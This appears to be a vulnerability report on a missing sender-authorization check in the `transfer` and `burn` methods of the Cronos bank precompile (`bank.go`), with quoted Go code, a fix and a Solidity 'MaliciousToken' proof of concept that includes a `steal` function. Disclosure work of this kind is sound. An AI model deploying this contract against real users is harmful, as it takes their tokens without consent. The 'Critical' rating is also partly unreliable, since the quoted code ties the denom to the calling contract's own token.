### Title
Unauthorized Transfer of Native EVM-Denom Tokens via Bank Precompile `transfer` Method — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method in the bank precompile (`x/cronos/keeper/precompiles/bank.go`) accepts an arbitrary `sender` address from call arguments without verifying that the calling contract is authorized to act on behalf of that address. Any deployed EVM contract can call `transfer(victimAddress, attackerAddress, amount)` to move `evm/<contract>` native tokens from any victim's Cosmos-side balance to any attacker address, with no consent from the victim.

---

### Finding Description

The bank precompile is registered at address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract. It exposes three state-mutating methods: `mint`, `burn`, and `transfer`. For all three, the token denom is derived from the calling contract's address:

```go
denom := EVMDenom(contract.Caller())   // "evm/0x<calling_contract>"
``` [1](#0-0) 

For `mint`, this is safe — the contract mints its own-denom tokens to a specified recipient. However, the `transfer` method takes the **source address** (`sender`) directly from the ABI-decoded call arguments:

```go
sender    := args[0].(common.Address)   // arbitrary — from call input
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [2](#0-1) 

There is **no check** that `contract.Caller() == sender`. The precompile unconditionally calls `bankKeeper.SendCoins(ctx, from, to, ...)` where `from` is the attacker-supplied address. Any contract can therefore drain `evm/<contract>` tokens from any account that holds them.

The same structural flaw exists in the `burn` case: the address to burn **from** is taken from `args[0]` (named `recipient` in the code, a misleading name), and there is no authorization check that the caller owns or has been approved to burn those tokens:

```go
recipient := args[0].(common.Address)   // address to burn FROM — no auth check
...
if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...); err != nil {
``` [3](#0-2) 

---

### Impact Explanation

**Critical — Unauthorized transfer/burn of CRC20/EVM-denom assets.**

A malicious contract `M` deployed at address `0xM`:

1. Calls `bankPrecompile.mint(victimAddress, N)` to issue `N` units of `evm/0xM` to a victim (e.g., as part of a seemingly legitimate airdrop or DeFi interaction).
2. Later calls `bankPrecompile.transfer(victimAddress, attackerAddress, N)` — the precompile executes `bankKeeper.SendCoins(victim, attacker, N evm/0xM)` with no victim consent.
3. All `evm/0xM` balances across every holder are drainable in a single transaction.

Alternatively, `M` calls `bankPrecompile.burn(victimAddress, N)` to destroy the victim's balance outright.

This maps directly to the allowed Critical impact: *unauthorized transfer/burn of EVM-denom assets controlled by a precompile*.

---

### Likelihood Explanation

The bank precompile is reachable by any unprivileged EVM contract with no governance or admin gate. The only precondition is that victims hold `evm/<contract>` tokens, which is a natural outcome of any contract that uses `mint` to distribute its native-denom tokens to users. No leaked keys, validator compromise, or cryptographic break is required.

---

### Recommendation

In the `transfer` method, enforce that the calling contract is the source of funds — i.e., only allow transferring from the contract's own Cosmos account:

```go
// Only the contract itself may be the sender
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Alternatively, implement an ERC20-style allowance mechanism so that a contract may only transfer tokens from an address that has explicitly approved it.

For `burn`, apply the same principle: only allow burning from the calling contract's own account, or require an explicit approval from the address being burned.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankPrecompile constant bank = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: Distribute tokens to victims (looks like a legitimate airdrop)
    function airdrop(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds `evm/<this contract>` native tokens
    }

    // Step 2: Steal all tokens from victim — no victim signature or approval needed
    function steal(address victim, address attacker, uint256 amount) external {
        // bank precompile uses contract.Caller() == address(this) for denom,
        // but takes `sender` from arguments with no authorization check
        bank.transfer(victim, attacker, amount);
    }
}
```

`steal()` succeeds because `bankKeeper.SendCoins(victim, attacker, N evm/<MaliciousToken>)` is executed directly with no check that `msg.sender == victim` or that `victim` approved the transfer. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L121-148)
```go
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
